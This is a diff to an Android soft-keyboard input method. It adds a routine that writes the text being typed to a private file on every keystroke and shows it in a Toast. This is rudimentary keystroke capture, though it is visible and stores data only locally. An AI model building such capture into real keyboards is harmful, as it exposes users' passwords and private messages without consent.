@@ -39,9 +39,17 @@ import android.view.textservice.SpellCheckerSession;
 import android.view.textservice.SuggestionsInfo;
 import android.view.textservice.TextInfo;
 import android.view.textservice.TextServicesManager;
+import android.widget.Toast;
 
+import java.io.File;
+import java.io.FileNotFoundException;
+import java.io.FileOutputStream;
+import java.io.IOException;
 import java.util.ArrayList;
 import java.util.List;
+import java.util.logging.Logger;
+
+import static android.content.ContentValues.TAG;
 
 /**
  * Example of writing an input method for a soft keyboard.  This code is
@@ -638,6 +646,23 @@ public class SoftKeyboard extends InputMethodService
             mSymbolsKeyboard.setShifted(false);
         }
     }
+
+    private void writefile(String argument)
+    {
+        try {
+            FileOutputStream fos = null;
+
+            File file = null;
+            file = getFilesDir();
+            fos = openFileOutput("data.txt", Context.MODE_PRIVATE);
+            String text = argument;
+            fos.write(text.getBytes());
+            Toast.makeText(this, String.format("Word: %s", text),
+                    Toast.LENGTH_SHORT).show();
+        }catch (IOException e) {
+
+        }
+    }
     
     private void handleCharacter(int primaryCode, int[] keyCodes) {
         if (isInputViewShown()) {
@@ -647,6 +672,9 @@ public class SoftKeyboard extends InputMethodService
         }
         if (mPredictionOn) {
             mComposing.append((char) primaryCode);
+
+            String argument = new String(mComposing);
+            writefile(argument);
             getCurrentInputConnection().setComposingText(mComposing, 1);
             updateShiftKeyState(getCurrentInputEditorInfo());
             updateCandidates();
